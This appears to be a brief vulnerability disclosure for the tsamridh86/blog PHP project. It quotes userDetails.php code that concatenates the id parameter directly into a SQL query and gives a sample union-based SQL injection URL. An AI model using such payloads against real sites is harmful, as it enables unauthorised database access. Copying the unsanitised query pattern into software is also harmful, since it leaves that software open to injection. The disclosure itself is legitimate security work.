# tsamridh86/blog sql injection #


## tsamridh86/blog ##
https://github.com/tsamridh86/blog/

## Vulnerability details ##
the Vulnerability in /blog/user/userDetails.php allows SQL Injection via the id parameter


	<?php
		require '../config/classBundle.php';
		$connect = new connector();
		$bloggerDetails = "select userName from blogger_info where bloggerId = ".$_GET['id'];
		$bloggerDetails = $connect->executeQuery($bloggerDetails);
		$blogger = new blogger();
		$bloggerDetails = $bloggerDetails->fetch_assoc();
		$blogger->getDetails($bloggerDetails['userName'])
	?>
$id has not been filtered to cause injection

##payload

http://target/user/userDetails.php?id=-1 and union select version()
